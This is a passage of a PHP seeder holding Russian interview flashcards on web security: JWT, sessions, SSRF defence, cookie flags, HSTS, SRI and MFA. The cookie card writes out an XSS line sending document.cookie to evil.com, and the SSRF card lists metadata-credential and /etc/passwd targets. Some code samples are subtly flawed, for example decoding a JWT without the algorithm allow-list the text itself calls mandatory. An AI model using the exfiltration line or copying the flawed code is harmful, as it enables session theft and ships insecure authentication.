<?php

namespace Database\Seeders\Data\Categories\SystemDesign;

class Security
{
    public static function all(): array
    {
        return [
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое JWT и какие плюсы и минусы?',
                'answer' => '**JWT** (JSON Web Token, `RFC 7519`) — **подписанный токен** из трёх частей через точку: `header.payload.signature`, каждая часть **base64url-кодирована**.

**Структура:**
- **header** — `{"alg":"HS256","typ":"JWT"}` — алгоритм подписи
- **payload** — `claims`: `sub` (user id), `iat`, `exp`, `aud`, кастомные роли
- **signature** — `HMAC` или `RSA`/`ECDSA` от `header.payload` секретом/приватным ключом

**Алгоритмы подписи:**
- **симметричные** — `HS256`/`HS384`/`HS512` (HMAC, один секрет)
- **асимметричные** — `RS256`/`ES256` (приватный подписывает, публичный проверяет — удобно для микросервисов)

**Плюсы:**
- **stateless** — сервер не хранит сессию, любой инстанс с ключом проверит
- **межсервисная аутентификация** — Service B верифицирует токен Service A через публичный ключ
- удобно для **SPA / mobile** клиентов

**Минусы:**
- **нельзя отозвать до `exp`** без серверного blacklist — теряем stateless
- **размер больше cookie** `session_id` (сотни байт vs ~30)
- **payload не зашифрован**, только подписан — НЕ клади туда чувствительное (для шифрования — `JWE`)
- классические атаки: `alg=none`, `RS256→HS256 confusion` (публичный ключ скармливают как HMAC-секрет) — обязателен **явный allow-list алгоритмов**

**Митигация:** короткий `exp` (5–15 мин) + **refresh token** в БД, явный `aud`/`iss`-чек, библиотеки с защитой от `alg=none`.',
                'code_example' => '<?php
use Firebase\\JWT\\JWT;
use Firebase\\JWT\\Key;

// Issue
$jwt = JWT::encode([
    "sub" => $user->id,
    "iat" => time(),
    "exp" => time() + 900,        // 15 минут
    "aud" => "api.example.com",
], $secret, "HS256");

// Verify — ОБЯЗАТЕЛЬНО явный allow-list алгоритмов
$payload = JWT::decode($jwt, new Key($secret, "HS256"));

// ❌ Уязвимо: позволяет alg=none / алгоритм-confusion
// JWT::decode($jwt, new Key($secret));  // без явного алгоритма

// Структура: header.payload.signature
// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJleHAiOjE3MDB9.<base64-signature>',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'JWT vs server-side sessions - что выбрать?',
                'answer' => 'Это **два разных подхода** к идентификации юзера между запросами — **stateful** vs **stateless**.

**Server-side session:**
- сервер хранит сессию в **общем store** (`Redis`, БД, `Memcached`)
- клиенту отдаёт **`session_id`** (`~30 байт`) в **`HttpOnly` cookie**
- на каждый запрос — `SELECT` из store по `session_id`
- **logout = `DELETE`** из store

**JWT (stateless):**
- сервер **ничего не хранит**, только **проверяет подпись**
- токен **self-contained**: внутри `sub`, `exp`, роли, что угодно
- на каждый запрос — проверка `HMAC`/`RSA` подписи + `exp`
- **logout — проблема** (см. карточку про отзыв JWT)

**Сравнение:**

| | **Sessions** | **JWT** |
|---|---|---|
| **Состояние на сервере** | да (`Redis`/БД) | **нет** |
| **Отзыв токена** | **мгновенный** (`DEL` из Redis) | сложный (denylist, `token_version`) |
| **Размер cookie/header** | `~30 байт` | `~500–1500 байт` |
| **Масштабирование** | нужен общий store | **любой инстанс с ключом** |
| **Микросервисы** | каждый идёт в общий store | service-to-service по `JWKS` |
| **Изменение профиля** | видно сразу | до `exp` — старые роли |
| **Подходит для SSR/web** | **отлично** | избыточно |
| **Подходит для mobile/SPA** | можно, но `cookie` неудобен | **естественно** |

**Когда что:**
- **Монолит, веб-приложение, одна БД** → **sessions**. Проще, безопаснее, проблем с отзывом нет.
- **Микросервисы с межсервисной аутентификацией** → JWT (`RS256` + `JWKS`).
- **Mobile/SPA + REST API** → JWT с **коротким `exp`** (15 мин) + **refresh token в БД**.
- **B2B SSO/OAuth-федерация** → **OIDC `id_token`** или **opaque token + introspection**.

**Anti-pattern:** JWT с `exp` через 30 дней без денилиста. После увольнения сотрудника он 30 дней ходит в систему.

**Эмпирическое правило:** **начинай с sessions**, переходи на JWT только когда **архитектура реально требует stateless** (микросервисы, edge, многоплатформенность).',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое access token и refresh token?',
                'answer' => 'Пара токенов разной длительности жизни — компромисс между **stateless-производительностью** и **возможностью отзыва**.

| | **Access token** | **Refresh token** |
|---|---|---|
| **Срок жизни** | 5–15 мин (до 1 ч) | дни / недели / месяцы |
| **Назначение** | пропуск к API на каждом запросе | обмен на новый `access` без перелогина |
| **Хранение клиентом** | память приложения / `Authorization: Bearer` | **HttpOnly + Secure + SameSite** cookie |
| **Где валидируется** | по подписи (`stateless`) | по записи в БД (`stateful`) |
| **Можно отозвать?** | нет, ждём `exp` | да, удалили из БД |

**Поток (flow):**
1. Клиент логинится → сервер выдаёт **пару**: `access` (15 мин) + `refresh` (30 дней)
2. Клиент шлёт `access` в `Authorization: Bearer ...` на каждый запрос
3. Когда API ответил `401` → клиент идёт на `POST /auth/refresh` с `refresh`
4. Сервер проверяет `refresh` в БД → выдаёт **новую пару**, старый `refresh` помечает использованным (**rotation**)
5. **Logout** = удаление `refresh` из БД, максимум через 15 мин старый `access` сам умрёт

**Зачем такой огород:**
- `access` короткий → утечка ограничена 15 минутами
- `refresh` хранится в БД → можно мгновенно **отозвать** (logout, смена пароля, бан)
- **rotation + reuse detection** — если кто-то использовал тот же `refresh` дважды, инвалидируем всю цепочку (украли)

Это стандарт **OAuth 2.0** и `Laravel Sanctum` / `Passport`.',
                'code_example' => '<?php
// POST /auth/login
return response()->json([
    "access_token" => JWT::encode([
        "sub" => $user->id,
        "exp" => time() + 900,                   // 15 минут
    ], $secret, "HS256"),
    "refresh_token" => DB::table("refresh_tokens")->insertGetId([
        "user_id" => $user->id,
        "token_hash" => hash("sha256", $raw = bin2hex(random_bytes(32))),
        "expires_at" => now()->addDays(30),
    ]) ? $raw : null,
]);

// POST /auth/refresh (rotation + reuse detection)
$row = DB::table("refresh_tokens")
    ->where("token_hash", hash("sha256", $raw))
    ->first();

if (!$row || $row->revoked_at) {
    // reuse detected — инвалидируем всю цепочку
    DB::table("refresh_tokens")->where("user_id", $row?->user_id)->update(["revoked_at" => now()]);
    abort(401);
}

// rotate: старый refresh помечаем, выдаём новую пару',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое RBAC и ABAC?',
                'answer' => 'Две модели **авторизации** (`AuthZ`), решающие «что юзеру можно делать».

**RBAC** (Role-Based Access Control) — доступ **через роли**:
- у пользователя одна или несколько **ролей** (`admin`, `editor`, `viewer`)
- у каждой роли — **набор permissions** (`posts.create`, `posts.delete`)
- проверка: «есть ли у юзера роль с нужным permission?»
- **прост в понимании**, легко рисуется матрицей `роль × ресурс`
- слабо учитывает **контекст** — нельзя сказать «редактировать может только автор поста»

**ABAC** (Attribute-Based Access Control) — доступ **через атрибуты**:
- решение строится из **атрибутов**: `subject` (юзер: `department=sales`), `resource` (пост: `owner_id=42`), `action` (`edit`), `environment` (`time`, `IP`)
- правила вида: «`edit` разрешён, если `subject.id == resource.owner_id` ИЛИ `subject.role == admin`»
- **гибко**, легко выражать ownership, time-based, location-based
- сложнее аудит — правила могут пересекаться, нужны политики (`OPA`, `Cedar`, `XACML`)

**Сравнение:**

| | **RBAC** | **ABAC** |
|---|---|---|
| **Гранулярность** | роль → permissions | per-resource атрибуты |
| **Контекст** | плохо | отлично |
| **Сложность** | низкая | высокая |
| **Когда брать** | стандартные приложения | сложные домены (медицина, банки) |

**На практике** — комбинируют: **RBAC как база** (роль `editor` даёт `posts.edit`) + **ABAC-правила сверху** (ownership: только свой пост).

**В Laravel:** `RBAC` — `spatie/laravel-permission`; `ABAC` — `Gate::define()` / `Policies` с проверкой ownership и контекста.',
                'code_example' => '<?php
// RBAC через spatie/laravel-permission
$user->assignRole("editor");
$user->givePermissionTo("posts.publish");
if ($user->hasPermissionTo("posts.publish")) { /* ... */ }

// ABAC через Policy: правило учитывает атрибуты ресурса и контекста
class PostPolicy
{
    public function update(User $user, Post $post): bool
    {
        return $user->id === $post->author_id        // ownership
            || $user->hasRole("admin")               // RBAC fallback
            || ($user->department === $post->department
                && now()->isBetween("09:00", "18:00")); // environment
    }
}

// Gate::authorize("update", $post) → 403, если правило не прошло',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое OWASP Top 10?',
                'answer' => '**OWASP Top 10** — топ-10 **самых критичных веб-уязвимостей** по версии **Open Web Application Security Project**. Базовый **чек-лист** для аудита и собесов. Версия 2021 (обновляется каждые 3–4 года):

| Код | Категория | Что значит |
|---|---|---|
| **A01** | Broken Access Control | Юзер обходит права (IDOR, force browsing, отсутствие проверки ownership) |
| **A02** | Cryptographic Failures | Plain-text пароли, слабые алгоритмы (`md5`, `RC4`), нет TLS |
| **A03** | Injection | `SQLi`, `NoSQLi`, command injection, LDAP injection |
| **A04** | Insecure Design | Архитектурные ошибки — нет threat modeling, нет rate limit на критичных операциях |
| **A05** | Security Misconfiguration | Дефолтные креды, `debug=true` в проде, открытые `.git`/`.env` |
| **A06** | Vulnerable Components | Устаревшие либы с CVE (`log4j`, `Spring4Shell`) |
| **A07** | Auth Failures | Слабые пароли, brute-force, credential stuffing, session fixation |
| **A08** | Data Integrity Failures | Supply chain (npm/composer-пакеты), unsigned auto-updates, insecure CI/CD |
| **A09** | Logging/Monitoring Failures | Нет логов входов/ошибок → атаку замечают через месяцы |
| **A10** | **SSRF** | Сервер по запросу клиента ходит на внутренний адрес (`169.254.169.254`, Redis) |

**Главное смещение 2021 vs 2017:**
- `Broken Access Control` поднялся с A05 на **A01** — №1 по частоте находок
- Появились **A04 Insecure Design** и **A10 SSRF** — раньше их не было

**Зачем знать:**
- Это **минимум**, который спрашивают на собесах и проверяют пентестеры
- Для каждой категории есть **OWASP Cheat Sheet** с готовыми митигациями
- Compliance (PCI-DSS, SOC 2) часто ссылается на этот список',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое SSRF и как защитить file_get_contents() / Guzzle, если URL вводит пользователь?',
                'answer' => '**SSRF** (Server-Side Request Forgery) — атака, в которой **злоумышленник заставляет сервер сделать HTTP-запрос** на адрес, выбранный атакующим. Сервер, в отличие от внешнего юзера, **имеет сетевой доступ внутрь VPC** — отсюда вся опасность.

**Канонические дыры:** «preview по URL», «загрузить аватарку из URL», парсер Open Graph, webhook receiver.

**Что атакующий читает:**
- **AWS metadata** — `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → IAM-credentials root-уровня
- **Внутренние сервисы** — `http://localhost:6379/` (Redis без auth), `http://internal-admin/`
- **GCP/Azure metadata** — `metadata.google.internal`
- **Файлы** через `file:///etc/passwd`

**Защита — многослойная:**
1. **Allowlist схем** — только `http`/`https`. Запретить `file://`, `gopher://` (можно отправить байты в любой TCP-сокет, включая `Redis`), `dict://`, `ftp://`
2. **Allowlist хостов** — если знаешь, что разрешено (например, `imgur.com`), сравнивай **после `DNS`-резолва**
3. **Резолв DNS вручную + проверка IP**:
   - **RFC 1918** — `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
   - **Loopback** — `127.0.0.0/8`, `::1`
   - **Link-local** — `169.254.0.0/16` (**метаданные облака!**)
   - **`0.0.0.0`**, `multicast`
4. **Защита от DNS rebinding** — резолви имя **один раз** и используй полученный `IP` для запроса (`Guzzle`: `CURLOPT_RESOLVE`). Иначе между TOCTOU атакующий подменит ответ DNS на внутренний IP
5. **Отдельный namespace/security group** без доступа в private-сети
6. **В cloud** — отключи **IMDSv1**, требуй **IMDSv2** с обязательным токеном
7. **Запретить редиректы** или проверять `Location` заново — `302` на `http://169.254.169.254` обходит примитивную проверку

**Минимальный safe-fetch:** allowlist схем + `gethostbynamel` + `filter_var FILTER_FLAG_NO_PRIV_RANGE|NO_RES_RANGE` + запрет редиректов + таймаут.',
                'code_example' => '<?php
use GuzzleHttp\\Client;

function fetchUserUrl(string $url): string
{
    // 1. allowlist схем
    $parsed = parse_url($url);
    if (!in_array($parsed["scheme"] ?? "", ["http", "https"], true)) {
        throw new InvalidArgumentException("scheme not allowed");
    }

    // 2. резолв и проверка IP до запроса
    $host = $parsed["host"] ?? "";
    $ip = gethostbyname($host);
    if ($ip === $host) throw new RuntimeException("dns resolve failed");

    if (
        filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false
    ) {
        throw new RuntimeException("private/reserved IP: $ip");
    }

    // 3. Guzzle: использовать уже зарезолвленный IP (защита от DNS rebinding)
    $client = new Client([
        "allow_redirects" => false,        // или с onRedirect-хуком, повторно проверяющим IP
        "connect_timeout" => 5,
        "timeout" => 10,
        "force_ip_resolve" => "v4",
        "curl" => [
            CURLOPT_RESOLVE => ["{$host}:443:{$ip}"],
            CURLOPT_PROTOCOLS => CURLPROTO_HTTP | CURLPROTO_HTTPS, // отключить gopher/file
        ],
    ]);

    return (string) $client->get($url)->getBody();
}',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Главная проблема JWT - как отозвать токен до истечения срока действия?',
                'answer' => '**JWT self-contained и stateless** — сервер проверяет только подпись, не делая запросов в БД. Из-за этого выданный JWT **нельзя отозвать принудительно** (при бане, смене пароля, logout).

**Стратегии решения (от чистого stateless к stateful):**

**1. Короткий срок жизни (exp) + Refresh Tokens:**
- access токен живёт **5–15 минут**, после чего клиент запрашивает новый по `refresh_token`
- `refresh_token` проверяется по БД/Redis. Если юзер забанен — рефреш не пройдёт
- компромисс: после бана юзер может делать запросы ещё максимум 15 минут

**2. Черный список в Redis (Denylist / Blacklist):**
- при logout токен (его уникальный id `jti`) пишется в Redis с TTL, равным оставшемуся времени жизни (`exp - now()`)
- API gateway / middleware проверяет `jti` в Redis на каждый запрос
- **Плюсы:** отзыв мгновенный
- **Минусы:** теряем чистый stateless (нужен быстрый Redis-чек на каждый запрос)

**3. Версионирование токенов (token_version):**
- в БД у юзера хранится `token_version` (целое число), оно же вшивается в JWT (`ver`)
- при смене пароля / logout на всех устройствах делаем `token_version++`
- при проверке JWT делаем `SELECT token_version FROM users`
- **Минусы:** каждый запрос требует похода в БД (или кэш), полностью убивая stateless-природу JWT.

**Когда что использовать:**
- для большинства проектов **схема №1 (короткий access-токен + рефреш в БД)** — идеальный баланс UX и безопасности
- для админок и финтеха добавляют **схему №2 (Redis denylist)** для мгновенной блокировки критических сессий.',
                'code_example' => '<?php
// Подход 2: Проверка jti в Redis (middleware)
public function handle(Request $request, Closure $next)
{
    $token = $request->bearerToken();
    $payload = JWT::decode($token, $this->secret);

    if (Redis::exists("jwt_blacklist:" . $payload->jti)) {
        abort(401, "Token revoked");
    }

    return $next($request);
}

// Подход 3: token_version
public function validate(string $jwt): User
{
    $payload = JWT::decode($jwt, $this->secret);
    $user = User::find($payload->sub);
    if ($user->token_version !== $payload->ver) {
        throw new TokenRevokedException;
    }
    return $user;
}',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Почему для шифрования в PHP сейчас рекомендуют sodium_*, а не openssl_*?',
                'answer' => '**`libsodium`** (`ext-sodium`, в стандарте PHP `7.2+`) — современная криптобиблиотека, портабильная реализация **`NaCl`** (Daniel J. Bernstein), спроектированная по принципу **«secure by default»**. **OpenSSL** — универсальный инструмент с тысячами опций, многие из которых небезопасны или устарели.

**Главные различия:**

| | **`sodium`** | **`openssl`** |
|---|---|---|
| **Поверхность API** | `~50` функций | тысячи |
| **Выбор cipher/mode/padding** | **зашит** в функцию | вручную, легко ошибиться |
| **AEAD из коробки** | **да** (всё authenticated) | только `GCM`/`CCM`/`ChaCha20-Poly1305` явно |
| **Defense от timing-атак** | **константное время** by design | надо помнить |
| **Memzero чувствительных данных** | **`sodium_memzero()`** | нет |
| **Защита от nonce misuse** | API подсказывает | можно переиспользовать `IV` |
| **Подписи** | `Ed25519` (быстрый, безопасный) | `RSA`/`ECDSA` (вариативность) |

**1. Защита от ошибок API.** В sodium практически нечего настраивать: `sodium_crypto_secretbox($plaintext, $nonce, $key)` — один правильный набор примитивов (`XSalsa20-Poly1305`), AEAD из коробки. В OpenSSL ты выбираешь `cipher` (`AES-128/256`), `mode` (`CBC/CTR/GCM`), padding, длину `IV` — шанс выбрать небезопасное (`CBC` без `HMAC` = padding oracle attack) огромен.

**2. Современные примитивы:**
- **`ChaCha20-Poly1305`** — быстрее `AES` на устройствах без `AES-NI` (мобилки, embedded)
- **`Curve25519`** / **`X25519`** — key exchange
- **`Ed25519`** — подписи
- **`BLAKE2b`** — хеш
- **`Argon2id`** — KDF

**3. Side-channel resistance.** Все sodium-функции — константное время. В OpenSSL ловушки есть.

**4. Forward secrecy и nonce-misuse resistance** — встроены в high-level API.

**Когда что использовать:**
- **Новый код** → **`sodium`** всегда
- **`openssl`** остаётся для: парсинг **`X.509`**-сертификатов, **`S/MIME`**, специфичные cipher для совместимости со сторонним сервером
- **Парные ключи (микросервисы)** → `sodium_crypto_sign_*` (`Ed25519`) лучше `RSA`

**Laravel `Crypt` фасад** (`Illuminate\\Encryption\\Encrypter`) реализован грамотно: по умолчанию `AES-256-CBC + HMAC-SHA256` в режиме **`Encrypt-then-MAC`** (защита от padding-oracle), с `9+` доступен `AES-256-GCM` через `cipher` в `config/app.php`. Для своего кода всё равно `sodium` предпочтительнее — меньше ручных параметров, встроенный AEAD.',
                'code_example' => '<?php
// ✅ sodium - secure by default
$key = sodium_crypto_secretbox_keygen(); // 32 байта, безопасный random
$nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES); // 24 байта
$ciphertext = sodium_crypto_secretbox("секретное сообщение", $nonce, $key);

// расшифровка с проверкой целостности (вернёт false при подмене)
$plaintext = sodium_crypto_secretbox_open($ciphertext, $nonce, $key);
if ($plaintext === false) throw new RuntimeException("tampered");

// Хеширование паролей (Argon2id - state-of-the-art)
$hash = sodium_crypto_pwhash_str(
    $password,
    SODIUM_CRYPTO_PWHASH_OPSLIMIT_INTERACTIVE,
    SODIUM_CRYPTO_PWHASH_MEMLIMIT_INTERACTIVE,
);
sodium_crypto_pwhash_str_verify($hash, $password); // bool

// Подписи (Ed25519)
[$sk, $pk] = [sodium_crypto_sign_keypair(), /* ... */];
$signed = sodium_crypto_sign_detached($message, $sk);
sodium_crypto_sign_verify_detached($signed, $message, $pk);

// ⚠️ openssl - те же задачи, но легко ошибиться
// AES-256-GCM (правильный выбор) - но многие пишут AES-256-CBC + забывают HMAC
$iv = random_bytes(openssl_cipher_iv_length("aes-256-gcm"));
$tag = "";
$ciphertext = openssl_encrypt(
    "сообщение", "aes-256-gcm", $key, OPENSSL_RAW_DATA, $iv, $tag, "", 16
);
// для расшифровки нужно сохранить и iv, и tag - забыл tag - нет проверки целостности

// Затирание чувствительных данных в памяти
sodium_memzero($password); // у openssl такого нет',
                'code_language' => 'php',
                'difficulty' => 5,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'В чём разница между OAuth 2.0 и OpenID Connect (OIDC)?',
                'answer' => 'Это **разные протоколы**, которые часто путают. На собесах ловят на подмене понятий.

| | **OAuth 2.0** | **OpenID Connect (OIDC)** |
|---|---|---|
| **Решает задачу** | АВТОРИЗАЦИЯ (`AuthZ`) делегирования | АУТЕНТИФИКАЦИЯ (`AuthN`) юзера |
| **Что говорит** | «приложению `X` разрешено вызывать API от юзера» | «вот **кто** этот юзер» |
| **На выходе** | `access_token` (часто opaque) | **`id_token`** (всегда JWT) + `access_token` |
| **Профиль юзера** | не входит в стандарт | claims: `sub`, `email`, `name`, `picture` |
| **Подписи** | необязательны | **обязательны**, через `JWKS` |
| **RFC** | `6749` | OIDC Core (поверх OAuth) |

**OAuth 2.0** — «пользователь разрешил приложению `X` доступ к API сервиса `Y` от своего имени». **НЕ говорит, кто юзер**. На выходе — `access_token` для API.

Flow: **Authorization Code + PKCE** (SPA/mobile, стандарт), **Client Credentials** (m2m), **Device Code** (TV/IoT), **Refresh Token**. `Implicit` и `ROPC` устарели.

**OIDC** — надстройка для **аутентификации**. Добавляет к OAuth flow **`id_token`** (всегда JWT) с claims:
- `sub` — user id
- `email`, `email_verified`
- `name`, `picture`
- `iss` (issuer), `aud`, `exp`, `iat`

**Эндпоинты OIDC:**
- **`/.well-known/openid-configuration`** — discovery, путь ко всем остальным
- `/authorize` — стандартный OAuth
- `/token` — обмен `code` на токены
- `/userinfo` — профиль по `access_token`
- **`/jwks`** — публичный ключ для проверки подписи `id_token`

**Когда что:**
- **«Войти через Google/GitHub»** → **OIDC**, нужен `id_token`
- **API gateway пропускает `access_token` к downstream сервисам** → OAuth 2.0
- **Cron вызывает чужой API** → OAuth 2.0 Client Credentials

**Anti-pattern:** использовать `access_token` для **аутентификации** — читать `sub` и считать юзера залогиненным. Токен может быть **opaque**, иметь `aud` другого ресурса, не содержать user info. **Для аутентификации — `id_token` из OIDC.**

**В Laravel:** `Socialite` использует OIDC под капотом для Google/GitHub/etc, выдаёт обёртку с `getEmail()`/`getName()`.',
                'code_example' => '<?php
// OIDC flow с Laravel Socialite (Google login)
// routes/web.php
Route::get("/login/google", fn () => Socialite::driver("google")->redirect());
Route::get("/login/google/callback", function () {
    $googleUser = Socialite::driver("google")->user();
    // под капотом: получили code → обменяли на access_token + id_token
    // Socialite верифицировал id_token и распарсил claims

    $user = User::updateOrCreate(
        ["email" => $googleUser->getEmail()],
        ["name" => $googleUser->getName(), "google_id" => $googleUser->getId()]
    );

    Auth::login($user); // классическая cookie-сессия Laravel - аутентификация юзера
});

// OAuth 2.0 (без OIDC) - доступ к чужому API от имени юзера
$response = Http::withToken($accessToken)
    ->get("https://api.dropbox.com/2/files/list_folder", ["path" => "/"]);

// Client Credentials - сервис-сервис
$token = Http::asForm()->post("https://auth.example.com/oauth/token", [
    "grant_type" => "client_credentials",
    "client_id" => env("CLIENT_ID"),
    "client_secret" => env("CLIENT_SECRET"),
    "scope" => "orders.read",
])->json("access_token");

// ID Token (JWT с user claims) - выдаётся OIDC, НЕ OAuth
// {
//   "iss": "https://accounts.google.com",
//   "sub": "1234567890",
//   "aud": "your-client-id.apps.googleusercontent.com",
//   "email": "user@example.com",
//   "email_verified": true,
//   "name": "John Doe",
//   "iat": 1717000000,
//   "exp": 1717003600
// }
// Подпись проверяется по JWKS issuer-а: GET https://accounts.google.com/.well-known/openid-configuration

// ❌ Анти-паттерн: использовать access_token как identity
// access_token может быть opaque, иметь aud другого ресурса, не содержать user info',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Какие флаги cookie и зачем нужны для защиты сессии?',
                'answer' => 'Флаги cookie — **дешёвый и эффективный** способ закрыть классические атаки на сессию.

- **`Secure`** — браузер шлёт cookie **только по HTTPS**. Без флага сессия утечёт через открытый Wi-Fi (`sslstrip`, `evil twin`).
- **`HttpOnly`** — cookie **не видна из JS** (`document.cookie`). XSS-payload не сможет утащить `session_id` через `fetch("//evil.com?c=" + document.cookie)`. **Главная защита от кражи сессии через XSS**.
- **`SameSite=Strict`** — cookie **никогда** не уходит на cross-site запросы. Полностью закрывает CSRF, но ломает UX: переход с внешней ссылки на сайт = разлогин.
- **`SameSite=Lax`** (дефолт в современных браузерах) — cookie уходит только на **top-level navigation** (`GET`-переходы), не на скрытые `POST`/iframe-запросы с другого сайта. **Закрывает 95% CSRF**.
- **`SameSite=None`** — отключает защиту, **обязательно с `Secure`**. Нужно для cross-origin сценариев (внешний iframe-виджет).
- **`Domain` и `Path`** — сужают область действия. Без `Domain` cookie действует **только на текущем хосте** (host-only). С `Domain=.example.com` — на всех поддоменах.
- **`Max-Age`/`Expires`** — срок жизни. Без них cookie — session-only (умирает с браузером).

**Префиксы — дополнительная защита:**
- **`__Host-`** — браузер **обязует** `Secure` + **без `Domain`** + `Path=/`. Поддомен **не сможет переписать** родительскую cookie.
- **`__Secure-`** — обязательный `Secure`, без других ограничений.

**Боевой минимум для session cookie:** `HttpOnly; Secure; SameSite=Lax; Path=/; __Host- префикс`.',
                'code_example' => '<?php
// Laravel — config/session.php
return [
    "lifetime" => 120,                     // минут
    "secure" => env("SESSION_SECURE_COOKIE", true),  // только HTTPS
    "http_only" => true,                   // не видна JS
    "same_site" => "lax",                  // защита от CSRF
    "domain" => null,                      // host-only — безопаснее
];

// Что отправит сервер
// Set-Cookie: laravel_session=abc123;
//             Path=/;
//             HttpOnly;
//             Secure;
//             SameSite=Lax

// Вручную (Symfony Cookie)
cookie("auth", $token, 60, "/", null, secure: true, httpOnly: true, sameSite: "Lax");',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое HSTS и какую проблему он решает поверх обычного https?',
                'answer' => '**HSTS** (HTTP Strict-Transport-Security, `RFC 6797`) — заголовок ответа, в котором сервер говорит браузеру: «**следующие `N` секунд ходи ко мне только по `https`** и **не доверяй сертификатам с ошибками**».

**Проблема, которую решает — `sslstrip` / MITM на первом запросе:**
1. Юзер набирает `bank.com` (без `https://`) — браузер шлёт `http://bank.com`
2. MITM перехватывает запрос, **не пускает редирект на https**
3. Юзер взаимодействует через `http`, MITM проксирует к серверу через `https`
4. Пароль уходит в открытом виде

**HSTS закрывает дыру для повторных визитов:** один раз получил заголовок → следующие `max-age` секунд браузер **сам апгрейдит** `http://` в `https://` **до отправки запроса**.

**Параметры:**
- **`max-age=31536000`** — год в секундах (минимум для прода)
- **`includeSubDomains`** — действие на все `*.bank.com`
- **`preload`** — заявка на включение в **встроенный в браузеры список** (`hstspreload.org`)

**Preload list** решает проблему **первого визита**: домены из списка зашиты в Chrome/Firefox/Safari, браузер **никогда** не отправит `http`, даже один раз.

**Пример заголовка:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Грабли:**
- `preload` — **необратимо** на месяцы. Удаление из списка занимает 6–12 недель. Включать только когда **уверены**, что весь домен и все поддомены на `https`
- `includeSubDomains` ломает поддомены без TLS (internal-only `admin.local.bank.com`)
- HSTS не работает на `IP`-адресах, только на доменах
- Сертификат **истёк** = сайт **недоступен** (нет fallback на `http`)',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое Subresource Integrity и когда её стоит включать?',
                'answer' => '**SRI** (Subresource Integrity, W3C) — атрибут **`integrity`** у тегов `<script>` и `<link rel="stylesheet">`, в котором указывается **`SHA`-хеш ожидаемого содержимого файла**. Браузер скачивает ресурс и **отказывается его выполнять**, если хеш не совпал.

**Защищает от:**
- **компрометации CDN** — атакующий взломал `cdn.example.com` и подменил `jquery.min.js`
- **MITM на CDN** (если кто-то умудрился без HTTPS)
- **rogue insider** на хостинге сторонней статики
- **supply chain атак** на npm/CDN-зеркала

**Пример:**
```html
<script
    src="https://cdn.example.com/jquery-3.7.0.min.js"
    integrity="sha384-NXgwF8Kv9SS1MMt..."
    crossorigin="anonymous"></script>
```

**`crossorigin="anonymous"`** обязателен для cross-origin ресурсов — без него SRI игнорируется (browser CORS-policy).

**Генерация хеша:**
```bash
curl -s https://cdn.example.com/jquery.min.js | \
    openssl dgst -sha384 -binary | openssl base64 -A
```

Можно указать **несколько хешей через пробел** — браузер пройдёт, если совпал любой (удобно для миграции версий).

**Когда включать:**
- **Сторонние скрипты с фиксированной версией** (`jquery-3.7.0.min.js`, `bootstrap-5.3.0.css`) — **обязательно**
- **Self-hosted статика на отдельном CDN** — желательно
- **Свой Vite/Webpack build на своём домене** — обычно не нужно, у тебя и так контроль
- **`@latest` / `unpkg.com/lib`** — **бессмысленно**, версия меняется

**Минусы:**
- Любое обновление CDN-файла = пересчёт хеша + правка HTML
- Не защищает от уязвимости в **самой библиотеке** (только от подмены файла)
- Не работает для динамических скриптов через `document.createElement("script")` без явного `integrity`',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Зачем нужна многофакторная аутентификация, если пароль уже надёжный?',
                'answer' => 'Любой пароль **может утечь**, и пользователь не узнает об этом:
- **фишинг** — ввёл на поддельной странице
- **password reuse** — слили базу соседнего сайта, тот же пароль работает у тебя
- **кейлоггер** на скомпрометированном устройстве
- **brute force / credential stuffing** — атакующий пробует пары `email/password` из утечек
- **внутренние** утечки (insider threat, упавший backup)

**MFA добавляет второй фактор из другой категории** — украсть оба одновременно гораздо сложнее.

**Три категории факторов:**
1. **Знание** (something you know) — пароль, PIN, ответ на секретный вопрос
2. **Владение** (something you have) — TOTP-приложение, аппаратный ключ, SMS на телефон, push в banking app
3. **Биометрия** (something you are) — отпечаток, Face ID, голос

Настоящий **MFA** — это **два фактора из разных категорий**. Два пароля — это не MFA.

**Сравнение реализаций:**

| Метод | RFC/стандарт | Защита от фишинга | Минусы |
|---|---|---|---|
| **`TOTP`** (Google Authenticator) | RFC 6238 | средняя — код можно ввести на поддельной странице | seed надо беречь |
| **SMS** | — | низкая — **SIM-swap**, перехват SS7 | NIST не рекомендует, но лучше чем ничего |
| **Push** (banking app) | — | средняя — пользователь может одобрить случайно | требует доверенного устройства |
| **`WebAuthn`/FIDO2** (YubiKey, Passkeys) | W3C/CTAP2 | **высокая — привязка к домену** | железо или поддержка ОС |

